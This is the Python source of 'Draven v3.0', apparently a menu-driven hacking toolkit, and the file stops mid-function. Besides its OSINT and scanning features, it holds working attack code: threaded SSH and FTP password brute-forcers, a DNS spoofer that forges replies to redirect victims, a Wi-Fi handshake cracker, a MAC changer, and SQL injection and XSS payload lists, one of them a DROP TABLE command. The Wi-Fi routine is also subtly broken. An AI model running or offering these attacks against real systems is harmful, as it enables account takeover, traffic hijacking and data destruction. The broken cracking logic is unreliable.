import os
import sys
import time
import json
import socket
import requests
import threading
import subprocess
import random
import string
from colorama import init, Fore, Style
import nmap
from scapy.all import sniff, ARP, Ether, srp, IP, TCP, UDP, ICMP, sendp, DNS, DNSQR, DNSRR
from bs4 import BeautifulSoup
import paramiko
from pyfiglet import Figlet
import dns.resolver
import whois
import shodan
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from concurrent.futures import ThreadPoolExecutor
import ftplib
import netifaces
import re

init()

version = "v3.0"
author = "Pharmyx"
divider = "═══════════════════════════════════════"
legal_warning = """
DISCLAIMER AND LEGAL WARNING:
This tool is provided for educational and ethical security testing purposes ONLY.
Unauthorized use against systems you don't own or have permission to test is ILLEGAL.
By using this tool, you agree that:
1. You will only use it on systems you have explicit permission to test
2. You will comply with all applicable laws (Computer Fraud and Abuse Act, GDPR, etc.)
3. The author is not responsible for any misuse or damage caused
4. Law enforcement may monitor tool usage - illegal activities will be reported

Penalties for unauthorized access can include:
- Federal prison sentences up to 10 years (US)
- Fines up to $500,000 (US)
- Civil lawsuits for damages
- Permanent criminal record

Proceed only if you understand and accept these terms.
"""

try:
    with open('config.json') as config_file:
        config = json.load(config_file)
        SHODAN_API_KEY = config.get('SHODAN_API_KEY', '')
        MAX_THREADS = config.get('MAX_THREADS', 10)
except FileNotFoundError:
    SHODAN_API_KEY = ''
    MAX_THREADS = 10
    print(Fore.YELLOW + "Config file not found. Using defaults: No Shodan API key, 10 threads." + Style.RESET_ALL)

def draven_banner():
    f = Figlet(font='bloody')
    print(Fore.BLUE + f.renderText("Draven") + Style.RESET_ALL)
    print(Fore.CYAN + f"Draven {version} - Advanced Hacking Tool")
    print("Created by " + Fore.BLUE + author + Fore.CYAN + " for authorized security testing")
    print("github.com/Pharmyx/Draven-Tool")
    print(Fore.BLUE + divider + Style.RESET_ALL)

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def show_legal_terms():
    clear_screen()
    draven_banner()
    print(Fore.RED + legal_warning + Style.RESET_ALL)
    input(Fore.WHITE + "\nPress Enter to return..." + Style.RESET_ALL)

def username_lookup():
    print(Fore.RED + "WARNING: This tool should only be used with permission from said person you are searching up" + Style.RESET_ALL)
    clear_screen()
    draven_banner()

    username = input(Fore.WHITE + "Enter username to lookup: " + Style.RESET_ALL)
    if not username:
        print(Fore.RED + "Username cannot be empty" + Style.RESET_ALL)
        input(Fore.WHITE + "\nPress Enter to return..." + Style.RESET_ALL)
        return

    print(Fore.YELLOW + f"\nSearching for username '{username}' across platforms..." + Style.RESET_ALL)

    platforms = {
        "Twitter": f"https://twitter.com/{username}",
        "GitHub": f"https://github.com/{username}",
        "Instagram": f"https://instagram.com/{username}",
        "Reddit": f"https://reddit.com/user/{username}",
        "LinkedIn": f"https://linkedin.com/in/{username}",
        "Pinterest": f"https://pinterest.com/{username}",
        "Medium": f"https://medium.com/@{username}",
        "Twitch": f"https://twitch.tv/{username}",
        "TikTok": f"https://tiktok.com/@{username}",
        "Snapchat": f"https://snapchat.com/add/{username}",
        "Facebook": f"https://www.facebook.com/{username}"
    }

    results = []
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'}

    def check_platform(platform, url):
        try:
            response = requests.get(url, headers=headers, timeout=5)
            if response.status_code == 200:
                return f"[+] {platform}: Found - {url}"
            elif response.status_code == 404:
                return f"[-] {platform}: Not found"
            else:
                return f"[-] {platform}: Status code {response.status_code}"
        except requests.RequestException as e:
            return f"[!] {platform}: Error - {str(e)}"

    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        futures = {executor.submit(check_platform, platform, url): platform for platform, url in platforms.items()}
        for future in futures:
            result = future.result()
            results.append(result)
            color = Fore.GREEN if "[+]" in result else Fore.YELLOW if "[-]" in result else Fore.RED
            print(color + result + Style.RESET_ALL)
            time.sleep(0.1) 

    print(Fore.CYAN + "\nResults displayed above. Copy them now if needed." + Style.RESET_ALL)
    input(Fore.WHITE + "\nPress Enter to return..." + Style.RESET_ALL)

def ip_tracker():
    clear_screen()
    draven_banner()
    ip = input(Fore.WHITE + "Enter IP address to track: " + Style.RESET_ALL)
    
    try:
        print(Fore.YELLOW + "\nGathering OSINT data..." + Style.RESET_ALL)
        
        response = requests.get(f"http://ip-api.com/json/{ip}")
        data = response.json()
        
        if data["status"] == "success":
            print(Fore.GREEN + "\n[+] Basic Information:" + Style.RESET_ALL)
            print(f"IP: {data['query']}")
            print(f"Location: {data['city']}, {data['regionName']}, {data['country']}")
            print(f"Coordinates: Lat {data['lat']}, Lon {data['lon']}")
            print(f"ISP: {data['isp']}")
            print(f"Organization: {data['org']}")
            print(f"AS Number: {data['as']}")
            
            try:
                print(Fore.GREEN + "\n[+] DNS Information:" + Style.RESET_ALL)
                resolver = dns.resolver.Resolver()
                answers = resolver.resolve(ip, 'PTR')
                for rdata in answers:
                    print(f"Reverse DNS: {rdata.target}")
            except:
                print(Fore.YELLOW + "No reverse DNS record found" + Style.RESET_ALL)
        else:
            print(Fore.RED + "Error: Invalid or private IP" + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + f"Error: {e}" + Style.RESET_ALL)
    
    print(Fore.CYAN + "\nResults displayed above. Copy them now if needed." + Style.RESET_ALL)
    input(Fore.WHITE + "\nPress Enter to return..." + Style.RESET_ALL)

def email_osint():
    clear_screen()
    draven_banner()
    email = input(Fore.WHITE + "Enter email address to investigate: " + Style.RESET_ALL)
    
    try:
        print(Fore.YELLOW + "\nGathering email OSINT data..." + Style.RESET_ALL)
        
        if '@' not in email or '.' not in email.split('@')[1]:
            print(Fore.RED + "Invalid email format" + Style.RESET_ALL)
            input(Fore.WHITE + "\nPress Enter to return..." + Style.RESET_ALL)
            return
        
        domain = email.split('@')[1]
        
        print(Fore.GREEN + "\n[+] Domain WHOIS Information:" + Style.RESET_ALL)
        try:
            w = whois.whois(domain)
            print(f"Domain: {w.domain_name}")
            print(f"Registrar: {w.registrar}")
            print(f"Creation Date: {w.creation_date}")
            print(f"Expiration Date: {w.expiration_date}")
            print(f"Name Servers: {', '.join(w.name_servers) if w.name_servers else 'None'}")
        except Exception as e:
            print(Fore.YELLOW + f"WHOIS lookup failed: {e}" + Style.RESET_ALL)
        
        print(Fore.GREEN + "\n[+] Mail Server Information:" + Style.RESET_ALL)
        try:
            answers = dns.resolver.resolve(domain, 'MX')
            for rdata in answers:
                print(f"Mail Server: {rdata.exchange} (Priority: {rdata.preference})")
        except Exception as e:
            print(Fore.YELLOW + f"MX lookup failed: {e}" + Style.RESET_ALL)
    
    except Exception as e:
        print(Fore.RED + f"Error: {e}" + Style.RESET_ALL)
    
    print(Fore.CYAN + "\nResults displayed above. Copy them now if needed." + Style.RESET_ALL)
    input(Fore.WHITE + "\nPress Enter to return..." + Style.RESET_ALL)

def advanced_nmap_scan():
    clear_screen()
    draven_banner()
    target = input(Fore.WHITE + "Enter target IP or hostname: " + Style.RESET_ALL)
    scan_type = input("Select scan type:\n1. Quick Scan\n2. Full Scan\n3. Vulnerability Scan\n4. Custom\nChoice: ")
    
    try:
        nm = nmap.PortScanner()
        print(Fore.YELLOW + "\nStarting scan..." + Style.RESET_ALL)
        
        if scan_type == "1":
            nm.scan(target, arguments='-T4 -F')
        elif scan_type == "2":
            nm.scan(target, arguments='-T4 -A -v -p-')
        elif scan_type == "3":
            nm.scan(target, arguments='-T4 -A -v --script vuln')
        elif scan_type == "4":
            custom_args = input("Enter custom Nmap arguments: ")
            nm.scan(target, arguments=custom_args)
        else:
            print(Fore.RED + "Invalid choice" + Style.RESET_ALL)
            input(Fore.WHITE + "\nPress Enter to return..." + Style.RESET_ALL)
            return
        
        print(Fore.GREEN + "\n[+] Scan Results:" + Style.RESET_ALL)
        for host in nm.all_hosts():
            print(f"\nHost: {host} ({nm[host].hostname()})")
            print(f"State: {nm[host].state()}")
            
            for proto in nm[host].all_protocols():
                print(f"\nProtocol: {proto}")
                ports = sorted(nm[host][proto].keys())
                
                for port in ports:
                    port_info = nm[host][proto][port]
                    print(f"Port: {port}\tState: {port_info['state']}\tService: {port_info['name']}")
                    if 'product' in port_info:
                        print(f"  Product: {port_info['product']}")
                    if 'version' in port_info:
                        print(f"  Version: {port_info['version']}")
                    if 'script' in port_info:
                        for script, output in port_info['script'].items():
                            print(f"  Script: {script}")
                            print(f"  Output: {output}")
        
        print(Fore.CYAN + "\nResults displayed above. Copy them now if needed." + Style.RESET_ALL)
    
    except nmap.PortScannerError as e:
        print(Fore.RED + f"Nmap error: {e}" + Style.RESET_ALL)
        print(Fore.YELLOW + "Ensure Nmap is installed and in your PATH." + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + f"Scan failed: {e}" + Style.RESET_ALL)
    
    input(Fore.WHITE + "\nPress Enter to return..." + Style.RESET_ALL)

def arp_spoof_detector():
    clear_screen()
    draven_banner()
    interface = input(Fore.WHITE + "Enter network interface (e.g., eth0 or Wi-Fi): " + Style.RESET_ALL)
    timeout = int(input("Enter scan duration in seconds: "))
    
    try:
        print(Fore.YELLOW + f"\nScanning for ARP spoofing (duration: {timeout}s)..." + Style.RESET_ALL)
        
        if os.name == 'nt':
            gw_ip = subprocess.check_output("route print", shell=True).decode().split('0.0.0.0')[1].split()[1]
        else:
            gw_ip = subprocess.check_output(["ip", "route", "show", "default"]).decode().split()[2]
        
        gw_mac = None
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=gw_ip), timeout=2, iface=interface, verbose=0)
        for snd, rcv in ans:
            gw_mac = rcv.src
            break
        
        if not gw_mac:
            print(Fore.RED + "Could not determine gateway MAC" + Style.RESET_ALL)
            input(Fore.WHITE + "\nPress Enter to return..." + Style.RESET_ALL)
            return
        
        print(Fore.GREEN + f"\nGateway IP: {gw_ip}, MAC: {gw_mac}" + Style.RESET_ALL)
        
        start_time = time.time()
        suspicious = set()
        
        def arp_monitor_callback(pkt):
            nonlocal suspicious
            if ARP in pkt and pkt[ARP].op == 2:
                if pkt[ARP].psrc == gw_ip and pkt[ARP].hwsrc != gw_mac:
                    msg = f"ARP Spoof detected! Fake MAC: {pkt[ARP].hwsrc} claiming to be {gw_ip}"
                    if msg not in suspicious:
                        print(Fore.RED + f"\n[!] {msg}" + Style.RESET_ALL)
                        suspicious.add(msg)
        
        print(Fore.YELLOW + "\nMonitoring ARP traffic..." + Style.RESET_ALL)
        sniff(prn=arp_monitor_callback, filter="arp", iface=interface, timeout=timeout)
        
        if not suspicious:
            print(Fore.GREEN + "\nNo ARP spoofing detected" + Style.RESET_ALL)
        else:
            print(Fore.RED + f"\nDetected {len(suspicious)} ARP spoofing attempts" + Style.RESET_ALL)
    
    except Exception as e:
        print(Fore.RED + f"Error: {e}" + Style.RESET_ALL)
    
    print(Fore.CYAN + "\nResults displayed above. Copy them now if needed." + Style.RESET_ALL)
    input(Fore.WHITE + "\nPress Enter to return..." + Style.RESET_ALL)

def website_crawler():
    clear_screen()
    draven_banner()
    url = input(Fore.WHITE + "Enter website URL (e.g., http://example.com): " + Style.RESET_ALL)
    max_depth = int(input("Enter crawl depth (1-3 recommended): "))
    
    try:
        print(Fore.YELLOW + "\nStarting website crawl..." + Style.RESET_ALL)
        
        visited = set()
        to_visit = [(url, 0)]
        results = {
            'pages': [],
            'forms': [],
            'links': set(),
            'vulnerabilities': []
        }
        
        options = Options()
        options.headless = True
        options.add_argument("--disable-gpu")
        options.add_argument("--disable-extensions")
        driver = webdriver.Chrome(options=options)
        
        while to_visit:
            current_url, depth = to_visit.pop(0)
            
            if current_url in visited or depth > max_depth:
                continue
                
            visited.add(current_url)
            
            try:
                print(Fore.CYAN + f"\nCrawling: {current_url} (Depth: {depth})" + Style.RESET_ALL)
                driver.get(current_url)
                page_source = driver.page_source
                soup = BeautifulSoup(page_source, 'html.parser')
                
                title = soup.title.string if soup.title else "No title"
                results['pages'].append({
                    'url': current_url,
                    'title': title,
                    'depth': depth
                })
                
                for link in soup.find_all('a', href=True):
                    href = link['href']
                    if href.startswith('http') and url in href:
                        results['links'].add(href)
                        if href not in visited:
                            to_visit.append((href, depth + 1))
                    elif href.startswith('/'):
                        full_url = url.rstrip('/') + href
                        results['links'].add(full_url)
                        if full_url not in visited:
                            to_visit.append((full_url, depth + 1))
                
                for form in soup.find_all('form'):
                    form_info = {
                        'url': current_url,
                        'action': form.get('action', ''),
                        'method': form.get('method', 'GET').upper(),
                        'inputs': []
                    }
                    
                    for input_tag in form.find_all('input'):
                        form_info['inputs'].append({
                            'name': input_tag.get('name', ''),
                            'type': input_tag.get('type', 'text')
                        })
                    
                    results['forms'].append(form_info)
                    
                    if form_info['method'] == 'GET' and any(i['type'] == 'password' for i in form_info['inputs']):
                        results['vulnerabilities'].append({
                            'type': 'Password in GET',
                            'url': current_url,
                            'severity': 'High'
                        })
                
                if any(word in page_source.lower() for word in ['wp-content', 'wordpress']):
                    results['vulnerabilities'].append({
                        'type': 'WordPress Detected',
                        'url': current_url,
                        'severity': 'Medium'
                    })
                
                time.sleep(0.5)
            
            except Exception as e:
                print(Fore.YELLOW + f"Error crawling {current_url}: {e}" + Style.RESET_ALL)
        
        driver.quit()
        
        print(Fore.GREEN + "\n[+] Crawl Results:" + Style.RESET_ALL)
        print(f"Pages crawled: {len(results['pages'])}")
        print(f"Unique links found: {len(results['links'])}")
        print(f"Forms found: {len(results['forms'])}")
        
        if results['vulnerabilities']:
            print(Fore.RED + "\n[!] Potential Vulnerabilities:" + Style.RESET_ALL)
            for vuln in results['vulnerabilities']:
                print(f"- {vuln['type']} at {vuln['url']} (Severity: {vuln['severity']})")
        
        print(Fore.CYAN + "\nResults displayed above. Copy them now if needed." + Style.RESET_ALL)
    
    except Exception as e:
        print(Fore.RED + f"Crawl failed: {e}" + Style.RESET_ALL)
    
    input(Fore.WHITE + "\nPress Enter to return..." + Style.RESET_ALL)

def ssh_bruteforce():
    clear_screen()
    draven_banner()
    print(Fore.RED + "WARNING: This tool should only be used on systems you own or have explicit permission to test." + Style.RESET_ALL)
    host = input(Fore.WHITE + "Enter SSH host: " + Style.RESET_ALL)
    username = input("Enter username: ")
    wordlist = input("Enter path to password wordlist: ")
    threads = min(int(input("Enter number of threads (1-10): ")), MAX_THREADS)
    
    if not os.path.exists(wordlist):
        print(Fore.RED + "Wordlist file not found" + Style.RESET_ALL)
        input(Fore.WHITE + "\nPress Enter to return..." + Style.RESET_ALL)
        return
    
    try:
        print(Fore.YELLOW + "\nStarting SSH brute force..." + Style.RESET_ALL)
        
        passwords = []
        with open(wordlist, 'r', errors='ignore') as f:
            passwords = [line.strip() for line in f if line.strip()]
        
        if not passwords:
            print(Fore.RED + "No passwords found in wordlist" + Style.RESET_ALL)
            input(Fore.WHITE + "\nPress Enter to return..." + Style.RESET_ALL)
            return
        
        print(f"Loaded {len(passwords)} passwords to test")
        
        stop_flag = threading.Event()
        lock = threading.Lock()
        found = False
        
        def ssh_attempt(password):
            nonlocal found
            if stop_flag.is_set():
                return
            
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(host, username=username, password=password, timeout=5, banner_timeout=5)
                with lock:
                    if not found:
                        print(Fore.GREEN + f"\n[+] Success! Password found: {password}" + Style.RESET_ALL)
                        found = True
                        stop_flag.set()
                ssh.close()
            except:
                pass
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(ssh_attempt, password) for password in passwords]
            for future in futures:
                future.result()
        
        if not found:
            print(Fore.RED + "\n[-] Password not found in wordlist" + Style.RESET_ALL)
    
    except Exception as e:
        print(Fore.RED + f"Error: {e}" + Style.RESET_ALL)
    
    print(Fore.CYAN + "\nResults displayed above. Copy them now if needed." + Style.RESET_ALL)
    input(Fore.WHITE + "\nPress Enter to return..." + Style.RESET_ALL)

def ftp_bruteforce():
    clear_screen()
    draven_banner()
    print(Fore.RED + "WARNING: This tool should only be used on systems you own or have explicit permission to test." + Style.RESET_ALL)
    host = input(Fore.WHITE + "Enter FTP host: " + Style.RESET_ALL)
    username = input("Enter username: ")
    wordlist = input("Enter path to password wordlist: ")
    threads = min(int(input("Enter number of threads (1-10): ")), MAX_THREADS)
    
    if not os.path.exists(wordlist):
        print(Fore.RED + "Wordlist file not found" + Style.RESET_ALL)
        input(Fore.WHITE + "\nPress Enter to return..." + Style.RESET_ALL)
        return
    
    try:
        print(Fore.YELLOW + "\nStarting FTP brute force..." + Style.RESET_ALL)
        
        passwords = []
        with open(wordlist, 'r', errors='ignore') as f:
            passwords = [line.strip() for line in f if line.strip()]
        
        if not passwords:
            print(Fore.RED + "No passwords found in wordlist" + Style.RESET_ALL)
            input(Fore.WHITE + "\nPress Enter to return..." + Style.RESET_ALL)
            return
        
        print(f"Loaded {len(passwords)} passwords to test")
        
        stop_flag = threading.Event()
        lock = threading.Lock()
        found = False
        
        def ftp_attempt(password):
            nonlocal found
            if stop_flag.is_set():
                return
            
            try:
                ftp = ftplib.FTP(host)
                ftp.login(username, password)
                with lock:
                    if not found:
                        print(Fore.GREEN + f"\n[+] Success! Password found: {password}" + Style.RESET_ALL)
                        found = True
                        stop_flag.set()
                ftp.quit()
            except:
                pass
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(ftp_attempt, password) for password in passwords]
            for future in futures:
                future.result()
        
        if not found:
            print(Fore.RED + "\n[-] Password not found in wordlist" + Style.RESET_ALL)
    
    except Exception as e:
        print(Fore.RED + f"Error: {e}" + Style.RESET_ALL)
    
    print(Fore.CYAN + "\nResults displayed above. Copy them now if needed." + Style.RESET_ALL)
    input(Fore.WHITE + "\nPress Enter to return..." + Style.RESET_ALL)

def wifi_password_cracker():
    clear_screen()
    draven_banner()
    print(Fore.RED + "WARNING: This tool should only be used on networks you own or have explicit permission to test." + Style.RESET_ALL)
    interface = input(Fore.WHITE + "Enter wireless interface (e.g., wlan0): " + Style.RESET_ALL)
    ssid = input("Enter target Wi-Fi SSID: ")
    wordlist = input("Enter path to password wordlist: ")
    
    if not os.path.exists(wordlist):
        print(Fore.RED + "Wordlist file not found" + Style.RESET_ALL)
        input(Fore.WHITE + "\nPress Enter to return..." + Style.RESET_ALL)
        return
    
    try:
        print(Fore.YELLOW + "\nStarting Wi-Fi password cracking..." + Style.RESET_ALL)
        
        passwords = []
        with open(wordlist, 'r', errors='ignore') as f:
            passwords = [line.strip() for line in f if line.strip()]
        
        if not passwords:
            print(Fore.RED + "No passwords found in wordlist" + Style.RESET_ALL)
            input(Fore.WHITE + "\nPress Enter to return..." + Style.RESET_ALL)
            return
        
        print(f"Loaded {len(passwords)} passwords to test")
        
        if os.name != 'nt':  # Linux/macOS
            # Enable monitor mode
            subprocess.run(["sudo", "ifconfig", interface, "down"], check=True)
            subprocess.run(["sudo", "iwconfig", interface, "mode", "monitor"], check=True)
            subprocess.run(["sudo", "ifconfig", interface, "up"], check=True)
            
            # Scan for networks and capture handshake
            print(Fore.YELLOW + "\nCapturing Wi-Fi handshake (this may take a while)..." + Style.RESET_ALL)
            subprocess.run(["sudo", "airodump-ng", "--bssid", ssid, "--write", "handshake", interface], timeout=60)
            
            # Attempt to crack the password
            for password in passwords:
                print(Fore.CYAN + f"Trying password: {password}" + Style.RESET_ALL)
                result = subprocess.run(["sudo", "aircrack-ng", "-w", wordlist, "-b", ssid, "handshake.cap"], capture_output=True, text=True)
                if "KEY FOUND" in result.stdout:
                    print(Fore.GREEN + f"\n[+] Success! Wi-Fi Password: {password}" + Style.RESET_ALL)
                    break
            else:
                print(Fore.RED + "\n[-] Password not found in wordlist" + Style.RESET_ALL)
            
            # Clean up
            subprocess.run(["sudo", "rm", "handshake.cap"], check=True)
            subprocess.run(["sudo", "ifconfig", interface, "down"], check=True)
            subprocess.run(["sudo", "iwconfig", interface, "mode", "managed"], check=True)
            subprocess.run(["sudo", "ifconfig", interface, "up"], check=True)
        else:
            print(Fore.RED + "Wi-Fi cracking is not supported on Windows. Use Linux with a compatible wireless adapter." + Style.RESET_ALL)
    
    except subprocess.CalledProcessError as e:
        print(Fore.RED + f"Error: {e}" + Style.RESET_ALL)
        print(Fore.YELLOW + "Ensure aircrack-ng is installed and you have root privileges." + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + f"Error: {e}" + Style.RESET_ALL)
    
    print(Fore.CYAN + "\nResults displayed above. Copy them now if needed." + Style.RESET_ALL)
    input(Fore.WHITE + "\nPress Enter to return..." + Style.RESET_ALL)

def network_traffic_analyzer():
    clear_screen()
    draven_banner()
    interface = input(Fore.WHITE + "Enter network interface (e.g., eth0 or Wi-Fi): " + Style.RESET_ALL)
    duration = int(input("Enter analysis duration in seconds: "))
    
    try:
        print(Fore.YELLOW + f"\nAnalyzing network traffic on {interface} for {duration} seconds..." + Style.RESET_ALL)
        
        packet_counts = {'TCP': 0, 'UDP': 0, 'ICMP': 0, 'Other': 0}
        ip_sources = {}
        ip_destinations = {}
        
        def packet_callback(pkt):
            if pkt.haslayer(IP):
                src_ip = pkt[IP].src
                dst_ip = pkt[IP].dst
                ip_sources[src_ip] = ip_sources.get(src_ip, 0) + 1
                ip_destinations[dst_ip] = ip_destinations.get(dst_ip, 0) + 1
                
                if pkt.haslayer(TCP):
                    packet_counts['TCP'] += 1
                elif pkt.haslayer(UDP):
                    packet_counts['UDP'] += 1
                elif pkt.haslayer(ICMP):
                    packet_counts['ICMP'] += 1
                else:
                    packet_counts['Other'] += 1
        
        sniff(iface=interface, prn=packet_callback, filter="ip", timeout=duration)
        
        print(Fore.GREEN + "\n[+] Network Traffic Analysis Results:" + Style.RESET_ALL)
        print("\nPacket Types:")
        for proto, count in packet_counts.items():
            print(f"{proto}: {count} packets")
        
        print("\nTop Source IPs:")
        sorted_ips = sorted(ip_sources.items(), key=lambda x: x[1], reverse=True)[:5]
        for ip, count in sorted_ips:
            print(f"{ip}: {count} packets")
        
        print("\nTop Destination IPs:")
        sorted_dests = sorted(ip_destinations.items(), key=lambda x: x[1], reverse=True)[:5]
        for ip, count in sorted_dests:
            print(f"{ip}: {count} packets")
        
        print(Fore.CYAN + "\nResults displayed above. Copy them now if needed." + Style.RESET_ALL)
    
    except Exception as e:
        print(Fore.RED + f"Error: {e}" + Style.RESET_ALL)
    
    input(Fore.WHITE + "\nPress Enter to return..." + Style.RESET_ALL)

def dns_spoofer():
    clear_screen()
    draven_banner()
    print(Fore.RED + "WARNING: This tool should only be used on networks you own or have explicit permission to test." + Style.RESET_ALL)
    interface = input(Fore.WHITE + "Enter network interface (e.g., eth0): " + Style.RESET_ALL)
    target_domain = input("Enter domain to spoof (e.g., example.com): ")
    fake_ip = input("Enter IP to redirect to: ")
    duration = int(input("Enter spoofing duration in seconds: "))
    
    try:
        print(Fore.YELLOW + f"\nStarting DNS spoofing for {target_domain} to {fake_ip}..." + Style.RESET_ALL)
        
        if os.name == 'nt':
            gw_ip = subprocess.check_output("route print", shell=True).decode().split('0.0.0.0')[1].split()[1]
        else:
            gw_ip = subprocess.check_output(["ip", "route", "show", "default"]).decode().split()[2]
        
        def dns_spoof_callback(pkt):
            if pkt.haslayer(DNS) and pkt[DNS].qr == 0:  # DNS query
                if target_domain in str(pkt[DNS].qd.qname):
                    spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                                 UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
                                 DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, 
                                     an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=fake_ip))
                    sendp(spoofed_pkt, iface=interface, verbose=0)
                    print(Fore.GREEN + f"Spoofed DNS response sent to {pkt[IP].src}" + Style.RESET_ALL)
        
        print(Fore.YELLOW + "\nSpoofing DNS traffic (Ctrl+C to stop)..." + Style.RESET_ALL)
        sniff(iface=interface, filter="udp port 53", prn=dns_spoof_callback, timeout=duration)
        print(Fore.GREEN + "\nDNS spoofing stopped" + Style.RESET_ALL)
    
    except Exception as e:
        print(Fore.RED + f"Error: {e}" + Style.RESET_ALL)
        print(Fore.YELLOW + "Ensure you have root privileges and the interface is correct." + Style.RESET_ALL)
    
    print(Fore.CYAN + "\nResults displayed above. Copy them now if needed." + Style.RESET_ALL)
    input(Fore.WHITE + "\nPress Enter to return..." + Style.RESET_ALL)

def mac_address_changer():
    clear_screen()
    draven_banner()
    print(Fore.RED + "WARNING: This tool should only be used on systems you own or have explicit permission to test." + Style.RESET_ALL)
    interface = input(Fore.WHITE + "Enter network interface (e.g., eth0): " + Style.RESET_ALL)
    new_mac = input("Enter new MAC address (e.g., 00:11:22:33:44:55) or press Enter for random: ")
    
    if not new_mac:
        new_mac = ":".join(["".join(random.choices("0123456789ABCDEF", k=2)) for _ in range(6)])
        print(Fore.YELLOW + f"Generated random MAC: {new_mac}" + Style.RESET_ALL)
    
    try:
        print(Fore.YELLOW + "\nChanging MAC address..." + Style.RESET_ALL)
        
        if os.name == 'nt':
            # Windows
            current_mac = subprocess.check_output(f"getmac /v /fo csv | findstr {interface}", shell=True).decode().split(',')[2].strip('"')
            print(Fore.GREEN + f"Current MAC: {current_mac}" + Style.RESET_ALL)
            subprocess.run(f"reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Class\\{{4D36E972-E325-11CE-BFC1-08002BE10318}}\\0001 /v NetworkAddress /d {new_mac.replace(':', '')} /f", shell=True, check=True)
            subprocess.run("netsh interface set interface name=\"{}\" admin=disable".format(interface), shell=True, check=True)
            time.sleep(2)
            subprocess.run("netsh interface set interface name=\"{}\" admin=enable".format(interface), shell=True, check=True)
        else:
            # Linux/macOS
            current_mac = subprocess.check_output(["ifconfig", interface]).decode().split("ether")[1].split()[0]
            print(Fore.GREEN + f"Current MAC: {current_mac}" + Style.RESET_ALL)
            subprocess.run(["sudo", "ifconfig", interface, "down"], check=True)
            subprocess.run(["sudo", "ifconfig", interface, "hw", "ether", new_mac], check=True)
            subprocess.run(["sudo", "ifconfig", interface, "up"], check=True)
        
        print(Fore.GREEN + f"New MAC address set: {new_mac}" + Style.RESET_ALL)
    
    except subprocess.CalledProcessError as e:
        print(Fore.RED + f"Error: {e}" + Style.RESET_ALL)
        print(Fore.YELLOW + "Ensure you have root/admin privileges and the interface is correct." + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + f"Error: {e}" + Style.RESET_ALL)
    
    print(Fore.CYAN + "\nResults displayed above. Copy them now if needed." + Style.RESET_ALL)
    input(Fore.WHITE + "\nPress Enter to return..." + Style.RESET_ALL)

def sql_injection_tester():
    clear_screen()
    draven_banner()
    url = input(Fore.WHITE + "Enter URL to test (e.g., http://test.com/page?id=1): " + Style.RESET_ALL)
    
    try:
        print(Fore.YELLOW + "\nTesting for SQL injection vulnerabilities..." + Style.RESET_ALL)
        
        payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "'; DROP TABLE users; --",
            "' UNION SELECT NULL, NULL --",
            "' AND 1=2 --"
        ]
        
        results = []
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'}
        
        for payload in payloads:
            test_url = url + payload
            try:
                response = requests.get(test_url, headers=headers, timeout=5)
                if any(error in response.text.lower() for error in ['sql', 'mysql', 'syntax', 'error']):
                    print(Fore.RED + f"\n[!] Potential SQL Injection Vulnerability: {test_url}" + Style.RESET_ALL)
                    results.append(f"Payload: {payload} - Vulnerable")
                else:
                    print(Fore.GREEN + f"Payload: {payload} - Not vulnerable" + Style.RESET_ALL)
                    results.append(f"Payload: {payload} - Not vulnerable")
            except requests.RequestException as e:
                print(Fore.YELLOW + f"Error testing {test_url}: {e}" + Style.RESET_ALL)
                results.append(f"Payload: {payload} - Error: {str(e)}")
            time.sleep(0.5)
        
        print(Fore.CYAN + "\nResults displayed above. Copy them now if needed." + Style.RESET_ALL)
    
    except Exception as e:
        print(Fore.RED + f"Error: {e}" + Style.RESET_ALL)
    
    input(Fore.WHITE + "\nPress Enter to return..." + Style.RESET_ALL)

def xss_scanner():
    clear_screen()
    draven_banner()
    url = input(Fore.WHITE + "Enter URL to test (e.g., http://test.com/search?q=test): " + Style.RESET_ALL)
    
    try:
        print(Fore.YELLOW + "\nTesting for XSS vulnerabilities..." + Style.RESET_ALL)
        
        payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "'><script>alert('XSS')</script>",
            "<svg onload=alert('XSS')>"
        ]
        
        results = []
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'}
        
        for payload in payloads:
            test_url = url + payload
            try:
                response = requests.get(test_url, headers=headers, timeout=5)
                if payload in response.text:
                    print(Fore.RED + f"\n[!] Potential XSS Vulnerability: {test_url}" + Style.RESET_ALL)
                    results.append(f"Payload: {payload} - Vulnerable")
                else:
                    print(Fore.GREEN + f"Payload: {payload} - Not vulnerable" + Style.RESET_ALL)
                    results.append(f"Payload: {payload} - Not vulnerable")
            except requests.RequestException as e:
                print(Fore.YELLOW + f"Error testing {test_url}: {e}" + Style.RESET_ALL)
                results.append(f"Payload: {payload} - Error: {str(e)}")
            time.sleep(0.5)
        
        print(Fore.CYAN + "\nResults displayed above. Copy them now if needed." + Style.RESET_ALL)
    
    except Exception as e:
        print(Fore.RED + f"Error: {e}" + Style.RESET_ALL)
    
    input(Fore.WHITE + "\nPress Enter to return..." + Style.RESET_ALL)

def packet_sniffer():
    clear_screen()
    draven_banner()
